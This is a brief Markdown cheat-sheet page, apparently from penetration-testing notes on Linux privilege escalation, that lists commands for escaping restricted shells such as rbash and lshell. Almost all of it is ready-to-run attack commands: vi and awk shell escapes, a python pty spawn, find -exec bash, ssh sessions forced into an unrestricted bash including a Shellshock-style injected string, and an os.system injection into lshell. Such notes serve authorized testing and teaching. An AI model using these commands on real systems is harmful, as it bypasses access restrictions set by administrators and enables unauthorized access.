# Restricted shell checks

[← Linux quick reference](../03-linux-privesc.md)

## Restricted shell escape (rbash / lshell / limited menus)
```bash
# Break out to a real shell:
vi              # then  :set shell=/bin/bash   ->  :shell    (or  :!/bin/bash)
python3 -c 'import pty;pty.spawn("/bin/bash")'
awk 'BEGIN{system("/bin/bash")}'
find / -name nonexistent -exec /bin/bash \; -quit
# Get in already-unrestricted:
ssh user@host -t "/bin/bash --noprofile --norc"
ssh user@host -t "() { :; }; /bin/bash"
# rbash: call binaries by absolute path (/bin/ls), or set PATH/SHELL if export allowed.
# lshell: try command injection inside an allowed builtin, or  echo os.system('/bin/bash')
```
